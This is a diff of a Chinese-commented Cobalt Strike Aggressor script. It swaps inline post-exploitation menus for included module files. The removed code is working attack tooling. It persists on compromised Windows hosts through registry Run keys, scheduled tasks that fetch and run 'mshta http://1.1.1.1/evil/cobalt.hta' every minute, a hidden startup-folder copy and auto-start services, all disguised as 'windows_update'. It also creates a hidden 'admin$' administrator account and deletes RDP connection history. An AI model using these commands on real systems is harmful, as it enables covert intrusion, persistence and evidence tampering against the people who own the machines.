@@ -1,265 +1,27 @@
 # Cobalt 脚本
-# 学习Aggressor-Scripts
+# 学习 Aggressor-Scripts
 # Author whois
 
-menubar("&上帝之眼", "god");
-
-popup god {
-    menu "主项" {
-        item "子项" {url_open("https://www.baidu.com");}
-    }
-    item "test" {
-        blog("test");
-        show_message("god");
-    }
-}
-
-# 快捷键绑定
-bind Ctrl+A {
-    show_message("Hello World!");
-}
-
 popup beacon_bottom {
-
-    menu "恶搞项目" {
-        item "打开IE" {
-            prompt_text("使用IE打开某站", "https://baidu.com", lambda({
-                binput(@ids,"C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
-                bshell(@ids, "C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
-            }, @ids => $1));
-        }
-
-        item "弹框框" {
-            prompt_text("Alert", "你好！", lambda({
-                bpowershell(@ids, 'Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox("' . $1 . '", "OKOnly,MsgBoxSetForeground,SystemModal,Exclamation", "")' );
-                blog(@ids,"发送消息: $1 ");
-            }, @ids => $1));
-        }
-
-
-    } 
-
-
-    menu "权限维持" {
-        item "定时任务" {
-            local('$bid');
-            foreach $bid ($1) {
-                schtasks($1);
-            }
-        }
-
-        item "注册表启动" {
-            local('$bid');
-            foreach $bid ($1) {
-                registry($1);
-            }
-         }
-
-        item "自启动目录" {
-            local('$bid');
-            foreach $bid ($1) {
-                startup($1);
-            }
-        }
-
-        item "服务启动" {
-            local('$bid');
-            foreach $bid ($1) {
-                services($1);
-            }
-        }
-
-        item "隐藏账号" {
-            local('$bid');
-            foreach $bid($1) {
-                bshell($bid, "net user admin$ 123!@#qwe /add&net localgroup administrators admin$ /add");
-            }
-        }
-
-        item "Waitfor" {
-            local('$bid');
-            foreach $bid($1) {
-                waitfor($1);
-            }
-        }
+    menu "God" {
+        include(script_resource("modules/fun.cna"));
+        include(script_resource("modules/info.cna"));
+        include(script_resource("modules/domain.cna"));
+        include(script_resource("modules/credential.cna"));
+        include(script_resource("modules/persistence.cna"));
+        include(script_resource("modules/logs.cna"));
+        include(script_resource("modules/other.cna"));
     }
-
-
-    menu "日志操作  " {
-        item "日志查询" {
-            local('$bid');
-            foreach $bid($1) {
-                bshell($bid, "wevtutil el&&dir %SystemRoot%\\System32\\Winevt\\Logs");
-            }
-        }
-
-        item "3389登陆清除" {
-            local('$bid');
-            foreach $bid($1) {
-                bshell($bid, "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default /va /f&&del \"%USERPROFILE%\\My Documents\\Default.rdp\" /a");
-            }
-        }
-
-    }
-
-
-    menu "其他操作" {
-        item "打包" {
-            
-        }
-
-        item "数据库备份" {
-
-        }
-
-        item "敏感文件" {
-
-        }
-
-    }
-
-
 }
 
+    
 
-# 注册表自启动函数
-sub registry {
-    $bid = $1;
-    $dialog = dialog("注册表自启动", %(filePath => "c:\\cs.exe"), lambda({
-        if ($2 eq 'Help'){
-            helpregistry()
-            break;
-        }
-
-        # $3 = %(filePath => 'c:\cs.exe')
-
-        foreach $key => $value ($3){
-            bshell($bid, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v windows_update /t REG_SZ /d \"$value\" /f");
-        }
-
-    }));
-
-    dialog_description($dialog, "写入注册表实现自启动");
-    drow_text($dialog, "filePath");
-    dbutton_action($dialog, "Run");
-    dbutton_action($dialog, "Help");
-    dialog_show($dialog);
-}
+    
 
 
-# 定时任务函数
-sub schtasks {
-    $bid = $1;
-    $dialog = dialog("定时任务", %(filePath => "mshta http://1.1.1.1/evil/cobalt.hta"), lambda({
-        if ($2 eq 'Help'){
-            helpschtasks()
-            break;
-        }
-
-        foreach $key => $value ($3){
-            bshell($bid, "schtasks /create /sc minute /mo 1 /tn windows_update /tr \"$value\"");
-        };
-
-    }));
-    dialog_description($dialog, "通过定时任务实现自启动");
-    drow_text($dialog, "filePath");
-    dbutton_action($dialog, "Run");
-    dbutton_action($dialog, "Help");
-    dialog_show($dialog);
-}
+    
 
 
-# 自启动目录函数
-sub startup {
-    $bid = $1;
-    $dialog = dialog("自启动目录", %(filePath => "c:\\cs.exe"), lambda({
-        if ($2 eq 'Help'){
-            helpstartup()
-            break;
-        }
-
-        foreach $key => $value ($3){
-            bshell($bid, "copy \"$value\" \"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update.exe\" /y");
-            bshell($bid, "attrib \"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update.exe\" +s +h");
-        };
-
-    }));
-    dialog_description($dialog, "通过拷贝到自启动目录，并隐藏文件来实现，可利用性较差");
-    drow_text($dialog, "filePath");
-    dbutton_action($dialog, "Run");
-    dbutton_action($dialog, "Help");
-    dialog_show($dialog);
-}
+    
 
 
-# 服务启动函数
-sub services {
-    $bid = $1;
-    $dialog = dialog("服务启动", %(filePath => "c:\\cs.exe"), lambda({
-        if ($2 eq 'Help'){
-            helpservices()
-            break;
-        }
-
-        foreach $key => $value ($3){
-            bshell($bid, "sc create windows_update binpath= \"$value\"&&sc config windows_update start= auto&&net start windows_update");
-        };
-
-    }));
-    dialog_description($dialog, "利用服务进行权限维持，可以获取系统权限");
-    drow_text($dialog, "filePath");
-    dbutton_action($dialog, "Run");
-    dbutton_action($dialog, "Help");
-    dialog_show($dialog);
-}
-
-
-# 隐藏账号
-
-
-
-# 帮助函数
-
-sub helpregistry {
-    show_message("
-Windows系统的开机项位于注册表的：
-    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
-    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
-
-CS Command：
-    reg query x86 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-    reg query x64 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-
-手动删除：
-    reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v windows_update /f
-
-")
-}
-
-
-sub helpschtasks {
-    show_message("
-每分钟执行一次命令（只要当前任务存在就不会多执行，支持重启）
-    schtasks /create /sc minute /mo 1 /tn \"windows_update\" /tr \"mshta http://xxx/1.hta\"
-    schtasks /create /sc ONLOGON /F /RL HIGHEST /tn 360update /tr \"mshta http://xxx/1.hta\"
-
-立即执行一次
-    schtasks /run /tn windows_update
-
-删除
-    schtasks /delete /f /tn windows_update
-")
-}
-
-sub helpstartup {
-    show_message("
-Windows自启动目录
-    C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-")
-}
-
-sub helpservices {
-    show_message("
-")
-}
